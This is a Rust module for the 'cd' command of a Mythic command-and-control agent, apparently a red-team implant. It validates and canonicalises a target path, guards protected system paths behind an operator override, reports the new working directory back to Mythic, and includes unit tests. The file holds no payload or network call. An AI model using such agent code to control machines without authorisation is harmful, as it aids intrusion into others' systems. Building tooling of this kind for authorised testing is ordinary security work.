//! Change the agent's current working directory — cross-platform.
//!
//! On success, sets the new cwd in the response so Mythic's
//! `updatecwd` RPC (driven by the Python `CdCommand.create_go_tasking`)
//! can mirror it to the callback's persistent state. The Mythic file
//! browser reads that state, so a `cd` issued from the CLI shows up
//! in the next `ls` click without a separate refresh.
//!
//! This is the only "command" that mutates a piece of state visible
//! outside the agent. Refusing to fail silently on errors: if the
//! path doesn't exist or isn't a directory, the cwd is left
//! untouched and an error string is returned.
//!
//! Task parameters (JSON):
//! ```json
//! { "path": "/etc" }
//! ```
//!
//! Wire-level cwd propagation:
//!
//! `TaskResponse` does not have a dedicated `cwd` field; we stash the
//! new value in the generic `process_response` JSON payload as
//! `{"cwd": "<new path>"}`. The Python `CdCommand.process_response`
//! reads that field and pushes the value into Mythic's persistent
//! callback state via the `callback_update` RPC. The Mythic file
//! browser reads that state, so a `cd` from the CLI is visible in
//! the next `ls` click without a separate refresh.

use std::path::Path;

use mythic::{TaskMessage, TaskResponse};
use serde::Deserialize;
use serde_json::json;

use crate::common::pathguard::is_protected_path;

#[derive(Deserialize)]
struct Params {
    path: String,
    /// When true, allow entering system paths (default false).
    /// Most file browsers never need this — they default to the agent's
    /// own cwd — but an operator who wants to browse /etc from the
    /// command line can opt in.
    #[serde(default)]
    allow_system_path: bool,
}

pub fn handle(task: &TaskMessage) -> TaskResponse {
    let params = match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => p,
        Err(e) => return TaskResponse::failed(task.id, &format!("cd parse error: {e}")),
    };

    if !params.allow_system_path && is_protected_path(&params.path) {
        return TaskResponse::failed(
            task.id,
            &format!(
                "refusing to cd into system path {}; set allow_system_path=true to override",
                params.path
            ),
        );
    }

    let path = Path::new(&params.path);

    // Validate up front: cd to a missing path leaves the old cwd
    // intact (POSIX behaviour) and the error should be loud, not a
    // silent "command completed".
    let meta = match std::fs::metadata(path) {
        Ok(m) => m,
        Err(e) => {
            return TaskResponse::failed(
                task.id,
                &format!("cd: cannot access {}: {e}", path.display()),
            )
        }
    };
    if !meta.is_dir() {
        return TaskResponse::failed(
            task.id,
            &format!("cd: not a directory: {}", path.display()),
        );
    }

    let canonical = match std::fs::canonicalize(path) {
        Ok(p) => p,
        Err(e) => {
            return TaskResponse::failed(
                task.id,
                &format!("cd: canonicalize {} failed: {e}", path.display()),
            )
        }
    };

    // The structured payload is the contract: Mythic's Python wrapper
    // mirrors it into the callback's persistent state via
    // `updatecwd`. The plain `user_output` line is what the operator
    // sees in the tasking panel.
    let display = canonical.to_string_lossy().to_string();
    TaskResponse {
        task_id: task.id,
        completed: Some(true),
        status: Some("completed".into()),
        user_output: Some(format!("cwd → {display}")),
        process_response: Some(json!({ "cwd": display })),
        ..Default::default()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::atomic::{AtomicUsize, Ordering};

    fn unique_tmp(label: &str) -> std::path::PathBuf {
        static COUNTER: AtomicUsize = AtomicUsize::new(0);
        let n = COUNTER.fetch_add(1, Ordering::Relaxed);
        let pid = std::process::id();
        let mut p = std::env::temp_dir();
        p.push(format!("nanaz-cd-test-{label}-{pid}-{n}"));
        std::fs::create_dir_all(&p).expect("create temp dir");
        p
    }

    #[test]
    fn test_cd_into_existing_dir() {
        let dir = unique_tmp("ok");
        let task = TaskMessage {
            command: "cd".into(),
            parameters: serde_json::json!({ "path": dir.to_string_lossy() }).to_string(),
            ..Default::default()
        };
        let resp = handle(&task);
        assert_eq!(resp.status.as_deref(), Some("completed"));
        let pr = resp.process_response.expect("process_response set");
        assert_eq!(pr["cwd"].as_str().unwrap(), dir.canonicalize().unwrap().to_string_lossy());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_cd_nonexistent() {
        let task = TaskMessage {
            command: "cd".into(),
            parameters: r#"{"path": "/nonexistent_path_xyz_123"}"#.into(),
            ..Default::default()
        };
        let resp = handle(&task);
        assert_eq!(resp.status.as_deref(), Some("error"));
    }

    #[test]
    fn test_cd_file_not_dir() {
        let dir = unique_tmp("file");
        let f = dir.join("notdir.txt");
        std::fs::write(&f, b"x").unwrap();

        let task = TaskMessage {
            command: "cd".into(),
            parameters: serde_json::json!({ "path": f.to_string_lossy() }).to_string(),
            ..Default::default()
        };
        let resp = handle(&task);
        assert_eq!(resp.status.as_deref(), Some("error"));
        let _ = std::fs::remove_dir_all(&dir);
    }
}
